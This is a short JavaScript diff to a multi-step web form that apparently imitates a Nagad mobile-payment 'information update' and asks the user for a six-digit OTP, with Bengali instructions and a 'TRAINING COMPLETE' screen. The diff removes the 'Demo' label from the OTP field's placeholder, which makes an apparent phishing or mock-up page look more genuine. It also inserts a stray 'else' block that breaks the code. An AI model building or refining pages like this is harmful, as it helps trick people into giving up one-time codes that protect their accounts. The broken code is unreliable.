@@ -32,7 +32,7 @@ const steps = [
   {
     title: "OTP Verification",
     description: "ভেরিফিকেশনের জন্য আপনার ফোনে ০৬ সংখ্যার ওটিপি পাঠানো হয়েছে, কল করে কেও কোড জানতে চাইলে তাকে ওটিপি প্রদান করা থেকে বিরত থাকুন।",
-    placeholder: "Demo OTP (যেমন 123456)",
+    placeholder: "123456",
     type: "text"
   }
 ];
@@ -114,6 +114,7 @@ back.addEventListener("click", function () {
     showStep();
   }
 });
+      } else {
     progress.textContent = "TRAINING COMPLETE";
     progressBar.style.width = "100%";
     title.textContent = "অনলাইন জুয়া এবং মানি লন্ডারিং প্রতিরোধে নগদ তথ্য হালনাগাদ 2026";
